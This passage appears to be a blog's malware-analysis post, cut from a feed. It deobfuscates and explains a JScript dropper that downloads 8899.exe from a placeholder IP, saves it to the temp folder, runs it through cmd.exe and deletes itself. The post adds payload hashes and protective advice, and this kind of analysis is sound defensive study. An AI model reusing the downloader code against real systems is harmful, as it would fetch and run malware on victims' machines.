+&lt;span class=&quot;nx&quot;&gt;oqavate7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ehynzedda7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;GetSpecialFolder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;typeof&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;undefined&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;kagignu5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;WScript&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CreateObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Scripting&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;FileSystemObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;GetTempName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;typeof&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;WScript&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;StdIn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;AtEndOfStream&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;unknown&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;ixzebni1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;WScript&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CreateObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;MSXML2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;XMLHTTP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'http://some_ip_address/8899.exe'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;ixzebni1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;WScript&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CreateObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;MSXML2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;XMLHTTP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;WScript&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CreateObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ADODB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Stream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WScript&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Arguments&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Unnamed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+			&lt;span class=&quot;nx&quot;&gt;oxacobmo3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;WScript&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CreateObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;MSXML2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;XMLHTTP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ResponseBody&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;ruzetpa0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;WScript&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ScriptFullName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;ixzebni1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;WScript&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CreateObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ADODB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Stream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;ixzebni1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;WScript&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CreateObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ADODB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Stream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;oxacobmo3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;ixzebni1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;WScript&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CreateObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ADODB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Stream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;SaveToFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;oqavate7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;kagignu5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;ixzebni1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;WScript&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CreateObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ADODB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Stream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;ixzebni1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;WScript&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CreateObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WScript&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exe&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;oqavate7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;kagignu5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;ixzebni1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;WScript&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CreateObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Scripting&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;FileSystemObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;deleteFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ruzetpa0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Okay, as far as I can understand, it downloads the file from url (not shown in this code), and somehow executes it, maybe using cmd?  But for better insight I had to dig for references showing the use of the WScript and other functions show in this code. &lt;/p&gt;
+
+&lt;h1&gt;Understanding&lt;/h1&gt;
+
+&lt;p&gt;&lt;b&gt;Windows Host Script&lt;/b&gt; is an Windows eviroment, providing the user with a possibility to run scripts in a variety of languages. By default, when JavaScript is saved to your hard drive, it will be run by WSH with power of executable file. &lt;/p&gt;
+
+&lt;p&gt;Script uses these WScript calls: &lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;b&gt;WScript.CreateObject(WScript.Shell)&lt;/b&gt; - provides access to shell methods of operating system.&lt;/li&gt;
+&lt;li&gt;&lt;b&gt;WScript.CreateObject(MSXML2.XMLHTTP)&lt;/b&gt; - XML request using HTTP.&lt;/li&gt;
+&lt;li&gt;&lt;b&gt;WScript.CreateObject(ADODB.Stream)&lt;/b&gt; - is used to represent a stream of data or text.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;b&gt;GetSpecialFolder(2)&lt;/b&gt; will get the %TEMP% folder. &lt;/p&gt;
+
+&lt;p&gt;Then the script creates the XML request to get the data from specified URL and, then it sends the request. &lt;/p&gt;
+
+&lt;p&gt;After that script creates a series of commands to: &lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;Get the response body of the request. &lt;/li&gt;
+&lt;li&gt;Write it to a file in tmp directory. &lt;/li&gt;
+&lt;li&gt;Save and close the file. &lt;/li&gt;
+&lt;li&gt;Execute through CMD&lt;/li&gt;
+&lt;li&gt;Lastly, it will delete the file. &lt;/li&gt;
+
+&lt;/ol&gt;
+
+&lt;p&gt;Unfortunately, .exe file was not available, while I got to check, and I couldn't find as much info about it as I wanted. The only information I could find were: &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Operating System: Windows 7 / 8 / 8.1 / 10
+Singature Name: QVM07.1.Malware.Gen
+
+Main Info:
+
+Name: 8899.exe
+
+Size: 569464
+
+Type: PE32 executable (GUI) Intel 80386, for MS Windows
+
+MD5: 3771453fc565a0436534d509dcb7da9f
+
+SHA1: 803e3634a70dd3b9ce2b409b108cb1baf5fa3d08
+
+Freezing computer.
+New home page in browsers.
+Ads and pop-ups on desktop and browser.
+Very slow loading speed of webpages.
+Computer work slower then usual.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h1&gt;Conclusion&lt;/h1&gt;
+
+&lt;p&gt;Author of this malware did a lot, to try and obfuscate this script, as I spent a lot of time trying to make it readable, but still it wasn't as complicated as I thought at first. To stay protected from these kinds of attacks, remember to tell explorer to open .js files through the Notepad by default, as well as show files with their extensions. That way you will see if it's really a text document or .txt.js malware. And the most important step, don't download files that you're unsure about. Simply, don't trust anyone ;) &lt;/p&gt;
+
+&lt;p&gt;I had great fun, trying to understand the concept, and even though you may think, that it was very simple, I still learned a lot from this. Anyway, thanks for reading, I hope you learned something new, and I'll see you in the next one! &lt;/p&gt;
+
+&lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><summary type="html">Backstory</summary></entry></feed>
